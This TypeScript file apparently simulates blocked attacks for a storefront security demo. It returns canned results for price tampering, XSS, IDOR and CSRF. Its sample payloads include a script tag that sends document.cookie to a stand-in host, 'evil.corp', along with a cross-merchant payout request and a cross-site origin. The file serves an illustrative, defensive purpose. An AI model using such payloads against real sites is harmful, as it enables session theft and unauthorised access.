export type AttackVectorType = 'PRICE_TAMPER' | 'XSS_INJECTION' | 'BOLA_IDOR' | 'CSRF_ORIGIN';

export interface SecurityViolationResult {
  readonly vector: AttackVectorType;
  readonly blocked: boolean;
  readonly httpStatus: 400 | 403 | 422 | 500;
  readonly code: string;
  readonly message: string;
  readonly timestamp: string;
  readonly payloadSample: string;
}

export const securityService = {
  simulateAttack(vector: AttackVectorType): SecurityViolationResult {
    const timestamp = new Date().toISOString();
    
    switch (vector) {
      case 'PRICE_TAMPER':
        return {
          vector,
          blocked: true,
          httpStatus: 422,
          code: 'ERR_PRICE_HASH_MISMATCH',
          message: 'Client-side price mutation rejected. Backend cryptographic signature recalculation detected manipulated cart total.',
          timestamp,
          payloadSample: '{"item_id": "prod-run-01", "submitted_price": 1.00, "actual_price": 210.00}'
        };

      case 'XSS_INJECTION':
        return {
          vector,
          blocked: true,
          httpStatus: 400,
          code: 'ERR_CSP_STRICT_VIOLATION',
          message: 'Content Security Policy (script-src nonce-based) blocked inline script execution attempt in review text.',
          timestamp,
          payloadSample: '<script>fetch("https://evil.corp/steal?cookie="+document.cookie)</script>'
        };

      case 'BOLA_IDOR':
        return {
          vector,
          blocked: true,
          httpStatus: 403,
          code: 'ERR_ABAC_OWNERSHIP_FAILURE',
          message: 'Merchant tenant boundary enforced. Caller token does not possess authorization claim for merchant ID VEND-009.',
          timestamp,
          payloadSample: 'GET /api/v1/vendor/payouts/VEND-009 (Session: VEND-001)'
        };

      case 'CSRF_ORIGIN':
        return {
          vector,
          blocked: true,
          httpStatus: 403,
          code: 'ERR_SEC_FETCH_SITE_VIOLATION',
          message: 'Cross-origin state-changing mutation prohibited by Sec-Fetch-Site: cross-site header inspection.',
          timestamp,
          payloadSample: 'Origin: https://malicious-phish.net -> Target: /api/v1/orders/cancel'
        };
    }
  }
};
